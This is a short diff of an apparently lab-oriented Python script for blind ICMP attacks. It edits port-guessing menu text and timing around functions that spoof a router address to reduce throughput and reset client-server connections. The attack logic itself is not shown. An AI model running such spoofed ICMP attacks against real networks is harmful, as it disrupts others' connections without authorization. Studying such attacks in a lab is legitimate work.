@@ -3,7 +3,6 @@ import struct
 import random
 import time
 
-## client port guessing -  commonly 49152–65535 on Linux
 CLIENT_IP = "10.0.0.2"        # Target client
 SERVER_IP = "10.0.0.1"        # Target server  
 ATTACKER_IP = "192.168.1.1"   # Spoofed router IP for throughput attack
@@ -14,11 +13,11 @@ icmp_reset_code = 3
 
 def get_port_scan_strategy():
     """Return port scanning strategy for blind attack"""
-    print("[ATTACKER] As a blind attacker, you must guess the client port...")
+    print("[ATTACKER] As a blind attacker, Try guessing the client port...")
     print("Strategies:")
-    print("1. Random sampling (1000 random ports) - realistic and fast")
-    print("2. Sequential scan (every 10th port) - systematic but slow")  
-    print("3. Full brute force (all 32768 ports) - guaranteed but very slow")
+    print("1. Random sampling (1000 random ports)")
+    print("2. Sequential scan (every 10th port)")  
+    print("3. Full brute force (all 32768 ports)")
     
     choice = input("Select scanning strategy (1-3): ")
     if choice == "1":
@@ -283,7 +282,7 @@ if __name__ == "__main__":
     elif choice == "3":
         print("[ATTACKER] Running combined attack...")
         icmp_throughput_reduction(sock, strategy)
-        time.sleep(2)
+        time.sleep(5)
         icmp_connection_reset(sock, strategy)
     else:
         print("Invalid choice")
